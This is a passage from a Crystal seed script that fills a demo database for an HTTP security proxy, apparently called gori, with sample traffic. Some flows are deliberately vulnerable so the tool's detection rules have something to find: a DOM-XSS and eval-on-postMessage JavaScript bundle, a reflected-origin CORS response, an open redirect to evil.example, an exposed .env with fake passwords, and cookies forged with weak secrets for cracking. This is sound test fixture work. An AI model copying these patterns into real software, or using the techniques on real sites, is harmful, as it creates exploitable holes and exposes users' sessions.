  status: 302, reason: "Found", resp_head: saml_resp, dur_us: 64_000_i64)

puts "• inserted protocol showcase: websocket(#{ws_msgs.size} msgs) + grpc + sse + 3×graphql + saml"

# --- Real target: www.hahwul.com (live — Repeater ^R genuinely hits it) ----
# Every flow below reflects an actual response captured from the real
# https://www.hahwul.com (GitHub Pages behind Fastly/Varnish) — titles, status
# codes and headers are accurate, bodies are trimmed. Unlike the fictional
# hosts above, sending one of these from Repeater really goes out over the
# network and comes back with a live response: good for trying Repeater/Diff/
# Probe against genuine traffic instead of only synthetic data.
gh_req_head = ->(method : String, target : String) {
  String.build do |b|
    b << method << ' ' << target << " HTTP/2\r\n"
    b << "host: www.hahwul.com\r\n"
    b << "user-agent: gori-demo/1.0\r\n"
    b << "accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n"
  end
}
gh_resp_head = ->(status : Int32, reason : String, ctype : String, size : Int32, etag : String, cache : String) {
  String.build do |b|
    b << "HTTP/2 " << status << ' ' << reason << "\r\n"
    b << "server: GitHub.com\r\n"
    b << "content-type: " << ctype << "\r\n"
    b << "content-length: " << size << "\r\n"
    b << "last-modified: Tue, 30 Jun 2026 14:14:45 GMT\r\n"
    b << "etag: \"" << etag << "\"\r\n"
    b << "access-control-allow-origin: *\r\n"
    b << "cache-control: max-age=600\r\n"
    b << "vary: Accept-Encoding\r\n"
    b << "via: 1.1 varnish\r\n"
    b << "x-cache: " << cache << "\r\n"
    b << "x-served-by: cache-icn1450039-ICN\r\n\r\n"
  end
}

hahwul_robots = "User-agent: *\nAllow: /\n\nSitemap: https://www.hahwul.com/sitemap.xml\n"
raw_flow(store, t.call(65), host: "www.hahwul.com", method: "GET", target: "/robots.txt",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/robots.txt"),
  status: 200, reason: "OK", ctype: "text/plain; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/plain; charset=utf-8", hahwul_robots.bytesize, "6a43cf48-44", "HIT"),
  resp_body: hahwul_robots.to_slice, dur_us: 165_000_i64)

hahwul_sitemap = <<-XML
  <?xml version="1.0" encoding="UTF-8"?>
  <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url><loc>https://www.hahwul.com/</loc></url>
    <url><loc>https://www.hahwul.com/posts/2026/rust-and-crystal/</loc><lastmod>2026-06-30</lastmod></url>
    <url><loc>https://www.hahwul.com/posts/2026/10years/</loc><lastmod>2026-02-22</lastmod></url>
    <url><loc>https://www.hahwul.com/posts/2026/traveling-with-hermes-in-japan/</loc><lastmod>2026-04-19</lastmod></url>
    <url><loc>https://www.hahwul.com/notes/claude-code/remove-co-authored-by/</loc></url>
    <url><loc>https://www.hahwul.com/about/</loc></url>
  </urlset>
  XML
raw_flow(store, t.call(68), host: "www.hahwul.com", method: "GET", target: "/sitemap.xml",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/sitemap.xml"),
  status: 200, reason: "OK", ctype: "application/xml",
  resp_head: gh_resp_head.call(200, "OK", "application/xml", hahwul_sitemap.bytesize, "6a43cf50-f19e", "MISS"),
  resp_body: hahwul_sitemap.to_slice, dur_us: 210_000_i64)

hahwul_home = html.call("Home | HAHWUL",
  "<h1>HAHWUL</h1><p>Offensive Security Engineer, Developer and H4cker.</p>" \
  "<nav><a href=/posts/>Posts</a> <a href=/notes/>Notes</a> <a href=/projects/>Projects</a> <a href=/about/>About</a></nav>")
ids[:hahwul_home] = raw_flow(store, t.call(71), host: "www.hahwul.com", method: "GET", target: "/",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/"),
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/html; charset=utf-8", hahwul_home.bytesize, "6a43cf55-3b80", "HIT"),
  resp_body: hahwul_home.to_slice, dur_us: 145_000_i64)

hahwul_css = <<-CSS
  /* =============================================================================
     Design Tokens
     Editorial · Monotone Dark · Pretendard-driven
     ============================================================================= */
  :root {
      --bg-primary: #0b0b0c;
      --bg-secondary: #131315;
      --bg-tertiary: #1c1c1f;
  }
  CSS
raw_flow(store, t.call(74), host: "www.hahwul.com", method: "GET", target: "/assets/css/01-reset.css?v=8e9d1251",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/assets/css/01-reset.css?v=8e9d1251"),
  status: 200, reason: "OK", ctype: "text/css; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/css; charset=utf-8", hahwul_css.bytesize, "6a43cf48-1573", "MISS"),
  resp_body: hahwul_css.to_slice, dur_us: 98_000_i64)

hahwul_posts = html.call("Posts | HAHWUL",
  "<h1>Posts</h1><ul>" \
  "<li><a href=/posts/2026/rust-and-crystal/>Rust and Crystal: My Two Main Languages</a></li>" \
  "<li><a href=/posts/2026/10years/>10 years</a></li>" \
  "<li><a href=/posts/2026/traveling-with-hermes-in-japan/>Traveling with Hermes in Japan</a></li>" \
  "</ul>")
raw_flow(store, t.call(77), host: "www.hahwul.com", method: "GET", target: "/posts/",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/posts/"),
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/html; charset=utf-8", hahwul_posts.bytesize, "6a43cf52-3b64", "HIT"),
  resp_body: hahwul_posts.to_slice, dur_us: 132_000_i64)

hahwul_post = html.call("Rust and Crystal: My Two Main Languages | HAHWUL",
  "<h1>Rust and Crystal: My Two Main Languages</h1><p>Balancing Popularity and Quiet Power</p>")
raw_flow(store, t.call(80), host: "www.hahwul.com", method: "GET", target: "/posts/2026/rust-and-crystal/",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/posts/2026/rust-and-crystal/"),
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/html; charset=utf-8", hahwul_post.bytesize, "6a43cf55-5069", "HIT"),
  resp_body: hahwul_post.to_slice, dur_us: 118_000_i64)

hahwul_note = html.call("Remove co-authored-by when committing | HAHWUL",
  "<h1>Remove co-authored-by when committing</h1>" \
  "<p>Claude Code에서 커밋 시 co-authored-by를 남기지 않도록 설정하는 방법</p>")
raw_flow(store, t.call(83), host: "www.hahwul.com", method: "GET", target: "/notes/claude-code/remove-co-authored-by/",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/notes/claude-code/remove-co-authored-by/"),
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/html; charset=utf-8", hahwul_note.bytesize, "6a43cf57-3e94", "MISS"),
  resp_body: hahwul_note.to_slice, dur_us: 140_000_i64)

hahwul_about = html.call("About | HAHWUL",
  "<h1>About</h1><p>Offensive Security Engineer, Developer and H4cker.</p>")
raw_flow(store, t.call(86), host: "www.hahwul.com", method: "GET", target: "/about/",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/about/"),
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_head: gh_resp_head.call(200, "OK", "text/html; charset=utf-8", hahwul_about.bytesize, "6a43cf55-561b", "HIT"),
  resp_body: hahwul_about.to_slice, dur_us: 121_000_i64)

hahwul_404 = html.call("404 Not Found | HAHWUL",
  "<h1>404</h1><p>The page you are looking for does not exist.</p>")
raw_flow(store, t.call(89), host: "www.hahwul.com", method: "GET", target: "/this-page-does-not-exist",
  http: "HTTP/2", req_head: gh_req_head.call("GET", "/this-page-does-not-exist"),
  status: 404, reason: "Not Found", ctype: "text/html; charset=utf-8",
  resp_head: gh_resp_head.call(404, "Not Found", "text/html; charset=utf-8", hahwul_404.bytesize, "6a43cf47-36ef", "HIT"),
  resp_body: hahwul_404.to_slice, dur_us: 108_000_i64)

puts "• inserted 9 real, replayable flows against www.hahwul.com"

# --- Act two: the surfaces a first pass usually misses ----------------------
# Each flow below exists to light up ONE thing a hunter does with gori and would
# otherwise have to bring their own traffic for: an OAuth code exchange, a CORS
# preflight, a multipart upload, a binary body (hex view), a non-UTF-8 page, a
# framework-signed session cookie (the Cookie workbench), and the artifacts the
# passive Probe rules are written against (.env, source map, directory listing).

# OAuth 2.0 / OIDC authorization-code flow across a third host. The `code` lands in a
# URL (query string) — which is what the `secret_in_url` passive rule is for — and the
# token response carries a second, DIFFERENT JWT (an id_token) to take to the JWT tab.
id_token = make_jwt(WEAK_SECRET,
  %({"alg":"HS256","typ":"JWT","kid":"demo-2026-06"}),
  %({"iss":"https://auth.demo.test","aud":"shop-web","sub":"1","email":"alice@demo.test","email_verified":true,"nonce":"n-0S6_WzA2Mj","iat":1718787600,"exp":1718791200}))

add_flow(store, t.call(92), host: "auth.demo.test",
  target: "/authorize?response_type=code&client_id=shop-web&redirect_uri=https%3A%2F%2Fshop.demo.test%2Fcallback&scope=openid+profile+email&state=xyz789&nonce=n-0S6_WzA2Mj",
  status: 302, reason: "Found",
  resp_headers: {"Location" => "https://shop.demo.test/callback?code=4%2F0AY0e-g5demo-auth-code&state=xyz789"})

ids[:oauth_cb] = add_flow(store, t.call(93), host: "shop.demo.test",
  target: "/callback?code=4%2F0AY0e-g5demo-auth-code&state=xyz789",
  status: 302, reason: "Found",
  resp_headers: {"Location"   => "/dashboard",
                 "Set-Cookie" => "sid=8f3a..; Path=/"})

# The client secret rides in the POST body — a real capture looks exactly like this,
# and it is the material the Rewriter's "redact" rule and Env masking are for.
ids[:oauth_token] = add_flow(store, t.call(94), host: "auth.demo.test", target: "/oauth/token",
  method: "POST", req_ctype: "application/x-www-form-urlencoded",
  req_body: "grant_type=authorization_code&code=4%2F0AY0e-g5demo-auth-code&redirect_uri=https%3A%2F%2Fshop.demo.test%2Fcallback&client_id=shop-web&client_secret=sh0p-w3b-cl13nt-s3cr3t",
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"access_token":"#{jwt}","id_token":"#{id_token}","refresh_token":"1//0edemo-refresh-token","token_type":"Bearer","expires_in":3600,"scope":"openid profile email"}))

# CORS preflight answered with a reflected origin AND credentials — the combination the
# `cors` passive rule flags, and the evidence behind the seeded active finding below.
ids[:cors] = add_flow(store, t.call(96), host: "api.demo.test", target: "/v1/cart", method: "OPTIONS",
  req_headers: {"Origin"                         => "https://evil.example",
                "Access-Control-Request-Method"  => "POST",
                "Access-Control-Request-Headers" => "authorization,content-type"},
  status: 204, reason: "No Content",
  resp_headers: {"Access-Control-Allow-Origin"      => "https://evil.example",
                 "Access-Control-Allow-Credentials" => "true",
                 "Access-Control-Allow-Methods"     => "GET, POST, PUT, DELETE, OPTIONS",
                 "Access-Control-Allow-Headers"     => "authorization, content-type",
                 "Vary"                             => "Origin"})

# Multipart upload: a body the detail pane renders as parts rather than one blob.
upload_boundary = "----gori7MA4YWxkTrZu0gW"
upload_body = String.build do |b|
  b << "--" << upload_boundary << "\r\n"
  b << "Content-Disposition: form-data; name=\"caption\"\r\n\r\nmy avatar\r\n"
  b << "--" << upload_boundary << "\r\n"
  b << "Content-Disposition: form-data; name=\"file\"; filename=\"avatar.png\"\r\n"
  b << "Content-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n(binary omitted)\r\n"
  b << "--" << upload_boundary << "--\r\n"
end
ids[:upload] = add_flow(store, t.call(98), host: "api.demo.test", target: "/v1/profile/avatar",
  method: "POST", req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_ctype: "multipart/form-data; boundary=#{upload_boundary}", req_body: upload_body,
  status: 201, reason: "Created", ctype: "application/json",
  resp_body: %({"ok":true,"url":"https://cdn.demo.test/avatars/1.png","bytes":#{upload_body.bytesize}}))

# A genuine (1×1) PNG: a body with no text rendering at all, so the detail pane falls
# back to the hex view. Also the smallest possible check that binary bodies round-trip.
png = Base64.decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
png_req = "GET /avatars/1.png HTTP/1.1\r\nHost: cdn.demo.test\r\nUser-Agent: gori-demo/1.0\r\nAccept: image/*\r\n\r\n"
png_resp = "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: image/png\r\nContent-Length: #{png.size}\r\nCache-Control: public, max-age=31536000\r\n\r\n"
ids[:png] = raw_flow(store, t.call(99), host: "cdn.demo.test", method: "GET", target: "/avatars/1.png",
  req_head: png_req, status: 200, reason: "OK", ctype: "image/png",
  resp_head: png_resp, resp_body: png, dur_us: 18_000_i64)

# A production bundle that ships its source map AND an inlined database URI — one
# response, two passive rules (`sourcemap`, `secret_in_body`), plus the DOM-sink patterns
# the `dom_xss` / `post_message` rules read. The credential is a DB URI rather than a
# provider-shaped key on purpose: a `sk_live_…`-shaped literal, however fake, trips secret
# scanners on the way into a git remote and this file has to survive a push.
# The source and its sink sit in the SAME statement on purpose: `dom_xss` pairs a taint
# source with a sink only inside one statement window, which is what keeps it off every
# minified bundle that merely contains both somewhere.
bundle_js = <<-JS
  !function(){var e=window.API||"https://api.demo.test/v1";
  var DSN="postgresql://demoshop:Sup3rS3cret-db-pw@db.internal.demo.test:5432/demoshop";
  document.getElementById("out").innerHTML=decodeURIComponent(location.hash.slice(1));
  window.addEventListener("message",function(m){eval(m.data.cmd)});
  fetch(e+"/products",{headers:{"X-Debug":"1"}})}();
  //# sourceMappingURL=app.min.js.map
  JS
ids[:bundle] = add_flow(store, t.call(101), host: "cdn.demo.test", target: "/assets/app.min.js",
  status: 200, reason: "OK", ctype: "application/javascript",
  resp_body: bundle_js)

# A deployed .env — the shortest path from recon to credentials, and the artifact the
# `exposed_config` passive rule anchors on.
ids[:dotenv] = add_flow(store, t.call(103), host: "shop.demo.test", target: "/.env",
  status: 200, reason: "OK", ctype: "text/plain",
  resp_body: <<-ENV
    APP_ENV=production
    APP_DEBUG=true
    APP_KEY=base64:9mJ0demoKEYdemoKEYdemoKEYdemoKEYdemoKEY=
    DB_CONNECTION=mysql
    DB_HOST=10.0.4.19
    DB_DATABASE=demoshop
    DB_USERNAME=demoshop
    DB_PASSWORD=Sup3rS3cret-db-pw
    MAIL_PASSWORD=mailer-pw-2026
    ENV
)

# nginx autoindex left on: a directory listing of uploads, with a stray backup file.
ids[:listing] = add_flow(store, t.call(104), host: "shop.demo.test", target: "/uploads/",
  status: 200, reason: "OK", ctype: "text/html",
  resp_body: <<-HTML
    <html>
    <head><title>Index of /uploads/</title></head>
    <body>
    <h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
    <a href="avatar-1.png">avatar-1.png</a>                              19-Jun-2026 09:02    1024
    <a href="db-backup.sql.gz">db-backup.sql.gz</a>                      18-Jun-2026 03:00 9241344
    <a href="invoice-2026-06.pdf">invoice-2026-06.pdf</a>                17-Jun-2026 11:20   88112
    </pre><hr></body>
    </html>
    HTML
)

# Open redirect: the `next` parameter lands in Location unvalidated.
ids[:redirect] = add_flow(store, t.call(106), host: "shop.demo.test",
  target: "/go?next=https%3A%2F%2Fevil.example%2Fharvest",
  status: 302, reason: "Found",
  resp_headers: {"Location" => "https://evil.example/harvest"})

# --- Framework session cookies (the Cookie workbench) -----------------------
# Three legacy services, three signing schemes, all three minted here with a weak
# secret so `cookie-decode` parses them and `gori run cookie --crack` recovers the key.
flask_cookie = Cookie::Flask.forge(
  %({"_fresh":true,"csrf_token":"9f3ademo","user_id":"1","role":"customer"}),
  COOKIE_SECRET, COOKIE_TS)
django_cookie = Cookie::Django.forge(
  %({"_auth_user_id":"1","_auth_user_backend":"django.contrib.auth.backends.ModelBackend","is_staff":false}),
  COOKIE_SECRET, COOKIE_TS)
rack_cookie = Cookie::Rack.forge(
  Base64.strict_encode("\x04\bo:\x11Session\x06:\tuseri\x06:\radmin?F"), RACK_SECRET)

# No HttpOnly, no Secure, no SameSite — the `cookies` passive rules read exactly this.
ids[:flask] = add_flow(store, t.call(110), host: "legacy.demo.test", target: "/admin/dashboard",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_headers: {"Set-Cookie"   => "session=#{flask_cookie}; Path=/",
                 "X-Powered-By" => "Flask/2.3.2 Python/3.11.4"},
  resp_body: html.call("Legacy admin", "<h1>Legacy admin</h1><p>Signed in as alice.</p>"))

ids[:django] = add_flow(store, t.call(112), host: "legacy.demo.test", target: "/py/portal",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_headers: {"Set-Cookie" => "sessionid=#{django_cookie}; Path=/; SameSite=Lax"},
  resp_body: html.call("Portal", "<h1>Portal</h1>"))

ids[:rack] = add_flow(store, t.call(113), host: "legacy.demo.test", target: "/rb/orders",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_headers: {"Set-Cookie" => "rack.session=#{rack_cookie}; path=/; HttpOnly"},
  resp_body: html.call("Orders", "<h1>Orders</h1>"))

# --- Encoding, size and timing edge cases -----------------------------------
# A EUC-KR page: bytes that are NOT valid UTF-8, so the body pane has to decide what to
# show rather than assume. (Hand-written bytes — no iconv dependency in the seeder.)
euckr_body = Bytes[
  0x3C, 0x68, 0x31, 0x3E,                         # <h1>
  0xB0, 0xF8, 0xC1, 0xF6, 0xBB, 0xE7, 0xC7, 0xD7, # 공지사항 (EUC-KR)
  0x3C, 0x2F, 0x68, 0x31, 0x3E, 0x0A,             # </h1>\n
]
euckr_req = "GET /ko/notice HTTP/1.1\r\nHost: shop.demo.test\r\nUser-Agent: gori-demo/1.0\r\nAccept-Language: ko-KR\r\n\r\n"
euckr_resp = "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: text/html; charset=euc-kr\r\nContent-Length: #{euckr_body.size}\r\n\r\n"
raw_flow(store, t.call(115), host: "shop.demo.test", method: "GET", target: "/ko/notice",
  req_head: euckr_req, status: 200, reason: "OK", ctype: "text/html; charset=euc-kr",
  resp_head: euckr_resp, resp_body: euckr_body, dur_us: 31_000_i64)

# A big page of JSON (~40 KB) — the read pane's scroll/search path, and the row that
# makes the History size column mean something.
big_items = String.build do |b|
  b << '['
  200.times do |i|
    b << ',' if i > 0
    b << %({"id":#{1000 + i},"sku":"DW-#{(1000 + i)}","name":"Demo Widget #{i}","price":#{999 + i * 7},"stock":#{(i * 13) % 97},"tags":["widget","demo","batch-#{i % 5}"]})
  end
  b << ']'
end
ids[:big] = add_flow(store, t.call(117), host: "api.demo.test", target: "/v1/products?page=3&limit=200",
  status: 200, reason: "OK", ctype: "application/json", resp_body: big_items, dur_us: 412_000_i64)

# A slow export: 8.4 s on the wire, so the duration column has a real outlier to sort to.
ids[:slow] = add_flow(store, t.call(120), host: "api.demo.test", target: "/v1/reports/export?format=csv",
  req_headers: {"Authorization" => "Bearer #{jwt}", "X-Debug" => "1"},
  status: 200, reason: "OK", ctype: "text/csv",
  resp_body: "order_id,user_id,total,created_at\n9,1,3998,2026-06-19T09:14:02Z\n10,2,1999,2026-06-19T09:21:44Z\n",
  dur_us: 8_400_000_i64)

# HTTP Basic on an internal endpoint (base64 of demo:metrics-pw) — decode it in the
# Decoder tab, and note that it rides an unencrypted http:// origin.
ids[:basic] = add_flow(store, t.call(122), scheme: "http", host: "legacy.demo.test", port: 8080,
  target: "/internal/metrics",
  req_headers: {"Authorization" => "Basic ZGVtbzptZXRyaWNzLXB3"},
  status: 200, reason: "OK", ctype: "text/plain",
  resp_body: "demo_orders_total 128\ndemo_login_failures_total 41\ndemo_build_info{version=\"4.2.1\"} 1\n")

# One request that never came back: the request side alone, no `update_response`. gori
# adopts such a row on the next open and marks it "orphaned by a previous session", so it
# reads ERR in History — which is precisely what a hung upstream leaves behind, and the
# only way to see that state without killing a live capture.
pending_body = %({"scope":"all"})
pending_head = "POST /v1/reports/rebuild HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
               "Authorization: Bearer #{jwt}\r\nContent-Type: application/json\r\nContent-Length: #{pending_body.bytesize}\r\n\r\n"
store.insert_flow(S::CapturedRequest.new(
  created_at: t.call(124), scheme: "https", host: "api.demo.test", port: 443,
  method: "POST", target: "/v1/reports/rebuild", http_version: "HTTP/1.1",
  head: pending_head.to_slice, body: pending_body.to_slice,
  body_size: pending_body.bytesize.to_i64, source: FS::Kind::Proxy))

puts "• inserted act-two traffic: oauth, cors, upload, png, bundle, .env, listing, redirect, 3 cookies, euc-kr, big/slow/basic/pending"

# --- Act three: protocol variety --------------------------------------------
# The showcase above holds ONE flow per protocol, and every one of them is a SUCCESSFUL
# exchange over TLS — the half of each protocol that never surprises anyone. This section is
# the other half, seeded so the code that CLASSIFIES and RENDERS a flow can be looked at
# instead of assumed:
#
#   * every label the History PROTO column can print, not just the TLS spellings: WS and
#     WSS, GRPC and GRPCS, SSE and SSES, plus the STUB a short-circuited flow gets;
#   * the classifications gori derives from something OTHER than a response content-type —
#     an RFC 8441 extended CONNECT (a WebSocket over HTTP/2: answered 200, never 101), an
#     extended CONNECT that is NOT a WebSocket (`connect-udp`), and a gRPC call answered by
#     a proxy's `text/html` 502 (still gRPC — the REQUEST said so);
#   * the framings whose RENDERING is the thing worth checking: server streaming, a grpc-web
#     trailer frame, a body cut mid-frame, a gzip'd chunked body, and a socket carrying
#     control frames, a fragmented message and an unmasked client frame;
#   * application protocols that are not HTTP at all and ride a WebSocket to get here: MQTT
#     (binary frames) and graphql-transport-ws (which lights up the GRAPHQL pane on a flow
#     that has no request body to decode);
#   * the flow STATES a clean capture never produces — Error, Aborted, and a response gori
#     wrote itself.
#
# A WebSocket CLOSE payload (§5.5.1): 2-byte big-endian status code, then a UTF-8 reason.
ws_close = ->(code : Int32, reason : String) {
  io = IO::Memory.new
  io.write_bytes(code.to_u16, IO::ByteFormat::BigEndian)
  io << reason
  io.to_slice
}

# CLEARTEXT WebSocket (ws://) — the row the PROTO column prints as `WS` rather than `WSS`,
# and the reason that distinction is drawn at all: this socket carries the session JWT in
# its first frame, in the clear, and a WSS row and a WS row are otherwise identical on the
# History line. The transcript also carries the frame shapes a plain chat log never has:
# an unmasked client frame (§5.1 violation — the most common WebSocket hardening probe),
# a message that arrived in three fragments, PING/PONG, an RSV1 frame on a socket that
# negotiated no extension (§5.2), a `[gori]` advisory row, and a CLOSE with code + reason.
ws_plain_req, ws_plain_resp = ws_heads("legacy.demo.test:8080", "/ws/notify", scheme: "http")
ids[:ws_plain] = raw_flow(store, t.call(126), scheme: "http", host: "legacy.demo.test", port: 8080,
  method: "GET", target: "/ws/notify", req_head: ws_plain_req,
  status: 101, reason: "Switching Protocols", resp_head: ws_plain_resp, dur_us: 2_400_000_i64)

[
  {"out", 1, %({"op":"auth","token":"#{jwt}"}).to_slice, S::WsShape.new},
  {"in", 1, %({"op":"auth.ok","user":"alice"}).to_slice, S::WsShape.new},
  # §5.1: a client frame MUST be masked. This one is not — a server that accepts it is the
  # finding, and without the shape columns the row would read as an ordinary text frame.
  {"out", 1, %({"op":"subscribe","topic":"orders"}).to_slice, S::WsShape.new(masked: false)},
  # Reassembled from three frames. The payload alone cannot say that; `frames` can.
  {"in", 1, %({"op":"event","topic":"orders","order":{"id":9,"total":3998,"status":"paid"}}).to_slice,
   S::WsShape.new(frames: 3)},
  {"out", 9, "hb".to_slice, S::WsShape.new}, # PING
  {"in", 10, "hb".to_slice, S::WsShape.new}, # PONG
  # RSV1 set on a socket whose handshake negotiated NO extension — a deliberate §5.2 probe,
  # so the payload is exactly the bytes the operator sent, not a deflate stream.
  {"out", 1, %({"op":"ping","rsv":"probe"}).to_slice, S::WsShape.new(rsv: 1)},
  {"in", 2, Bytes[0x08, 0x96, 0x01, 0x12, 0x07, 0x6f, 0x72, 0x64, 0x65, 0x72, 0x73, 0x18, 0x01], S::WsShape.new},
  # gori's own prose ABOUT the socket, on `Relay::NOTICE_DIRECTION` and behind `[gori] ` so
  # every repeater seed refuses to replay it as traffic. This is what a real advisory looks
  # like in the transcript.
  {"in", 1, "[gori] server→client: message exceeded the intercept parking ceiling; forwarded unheld".to_slice,
   S::WsShape.new},
  {"in", 8, ws_close.call(1000, "session expired"), S::WsShape.new},
].each { |(dir, op, payload, shape)| store.insert_ws_message(ids[:ws_plain], dir, op, payload, shape: shape) }

# WebSocket over HTTP/2 (RFC 8441 extended CONNECT). There is no 101 anywhere in this
# handshake — §5.1 replaces the h1 upgrade with `CONNECT` + a `:protocol` pseudo-header,
# answered 2xx — so the ONLY thing that makes this a WebSocket is the `connect_protocol`
# column (V16). The stored request head carries it as `HeadCodec`'s synthetic
# `X-Gori-Protocol` marker line, which is what a real capture writes.
ws_h2_conn = store.insert_h2_connection("api.demo.test", 443, "h2")
# SETTINGS with ENABLE_CONNECT_PROTOCOL (0x8) = 1 — without the origin advertising it, §5.1
# forbids the client from sending the extended CONNECT at all.
store.insert_h2_frame(ws_h2_conn, "in", 0x4_u8, 0x0_u8, 0_u32, Bytes[0x00, 0x08, 0x00, 0x00, 0x00, 0x01])
store.insert_h2_frame(ws_h2_conn, "out", 0x8_u8, 0x0_u8, 0_u32, Bytes[0x00, 0x0f, 0x00, 0x01])
store.insert_h2_frame(ws_h2_conn, "out", 0x1_u8, 0x4_u8, 1_u32,
  Bytes[0x83, 0x86, 0x41, 0x8a, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0xb8, 0xf0, 0x1e, 0x07])
store.insert_h2_frame(ws_h2_conn, "in", 0x1_u8, 0x4_u8, 1_u32, Bytes[0x88, 0x76, 0x8b, 0x77])
store.insert_h2_frame(ws_h2_conn, "out", 0x0_u8, 0x0_u8, 1_u32, Bytes.new(46))
store.insert_h2_frame(ws_h2_conn, "in", 0x0_u8, 0x0_u8, 1_u32, Bytes.new(58))
store.insert_h2_frame(ws_h2_conn, "in", 0x0_u8, 0x0_u8, 1_u32, Bytes.new(64))
store.flush

ws_h2_req = String.build do |b|
  b << "CONNECT /ws/notifications HTTP/2\r\n"
  b << "Host: api.demo.test\r\n"
  b << "user-agent: gori-demo/1.0\r\n"
  b << "origin: https://shop.demo.test\r\n"
  b << "sec-websocket-version: 13\r\n"
  b << "authorization: Bearer " << jwt << "\r\n"
  b << "X-Gori-Protocol: websocket\r\n\r\n"
end
# h2 has no reason phrase (RFC 9113 §8.3.2) — `HeadCodec.synth_response` stops at the code.
ws_h2_resp = "HTTP/2 200\r\nserver: nginx/1.25.3\r\nsec-websocket-version: 13\r\n\r\n"
ids[:ws_h2] = raw_flow(store, t.call(128), host: "api.demo.test", method: "CONNECT",
  target: "/ws/notifications", http: "HTTP/2", req_head: ws_h2_req,
  status: 200, resp_head: ws_h2_resp, dur_us: 3_100_000_i64,
  h2_conn_id: ws_h2_conn, h2_stream_id: 1_i64, connect_protocol: "websocket")

[
  {"out", 1, %({"type":"subscribe","channels":["orders","stock"]})},
  {"in", 1, %({"type":"ack","channels":["orders","stock"]})},
  {"in", 1, %({"type":"stock","sku":"BW-0042","stock":15})},
  {"in", 1, %({"type":"order","id":9,"status":"shipped"})},
  {"out", 1, %({"type":"unsubscribe","channels":["stock"]})},
].each { |(dir, op, payload)| store.insert_ws_message(ids[:ws_h2], dir, op, payload.to_slice) }

# An extended CONNECT that is NOT a WebSocket: `connect-udp` (RFC 9298, MASQUE) tunnels UDP
# datagrams through the proxy. It is the case `Proto.websocket_connect?` exists to REJECT —
# the token is the whole test, so this row stays HTTPS and carries no transcript, because
# the datagrams are not RFC 6455 frames and gori has nothing to show for them.
connect_udp_req = String.build do |b|
  b << "CONNECT /.well-known/masque/udp/10.0.4.53/53/ HTTP/2\r\n"
  b << "Host: proxy.demo.test\r\n"
  b << "user-agent: gori-demo/1.0\r\n"
  b << "capsule-protocol: ?1\r\n"
  b << "X-Gori-Protocol: connect-udp\r\n\r\n"
end
raw_flow(store, t.call(129), host: "proxy.demo.test", method: "CONNECT",
  target: "/.well-known/masque/udp/10.0.4.53/53/", http: "HTTP/2", req_head: connect_udp_req,
  status: 200, resp_head: "HTTP/2 200\r\ncapsule-protocol: ?1\r\n\r\n",
  dur_us: 1_800_000_i64, connect_protocol: "connect-udp")

# MQTT over WebSocket — an application protocol that is not HTTP in any part, tunnelled
# through one to reach a browser. Every frame is BINARY, so the MESSAGES pane shows
# «binary Nb» rather than text: the point is that gori captures the transcript at all, and
# that the subprotocol in the handshake (`mqtt`) is what names what those bytes are.
mqtt_req, mqtt_resp = ws_heads("iot.demo.test", "/mqtt", subprotocol: "mqtt")
ids[:mqtt] = raw_flow(store, t.call(131), host: "iot.demo.test", method: "GET", target: "/mqtt",
  req_head: mqtt_req, status: 101, reason: "Switching Protocols", resp_head: mqtt_resp,
  dur_us: 4_700_000_i64)

mqtt_connect = IO::Memory.new
mqtt_connect.write(mqtt_string("MQTT"))
mqtt_connect.write(Bytes[0x04, 0xc2, 0x00, 0x3c]) # level 4, user+pass+clean-session, keepalive 60
mqtt_connect.write(mqtt_string("shop-web-001"))
mqtt_connect.write(mqtt_string("demo"))
mqtt_connect.write(mqtt_string("mqtt-pw-2026")) # credentials in the clear inside the frame
mqtt_sub = IO::Memory.new
mqtt_sub.write(Bytes[0x00, 0x01]) # packet id
mqtt_sub.write(mqtt_string("shop/orders/#"))
mqtt_sub.write(Bytes[0x01]) # QoS 1
[
  {"out", mqtt_packet(0x10_u8, mqtt_connect.to_slice)},                     # CONNECT
  {"in", mqtt_packet(0x20_u8, Bytes[0x00, 0x00])},                          # CONNACK, accepted
  {"out", mqtt_packet(0x82_u8, mqtt_sub.to_slice)},                         # SUBSCRIBE
  {"in", mqtt_packet(0x90_u8, Bytes[0x00, 0x01, 0x01])},                    # SUBACK
  {"in", mqtt_publish("shop/orders/9", %({"status":"paid","total":3998}))}, # PUBLISH
  {"in", mqtt_publish("shop/orders/10", %({"status":"picked","total":1999}))},
  {"out", mqtt_packet(0xc0_u8, Bytes.new(0))}, # PINGREQ
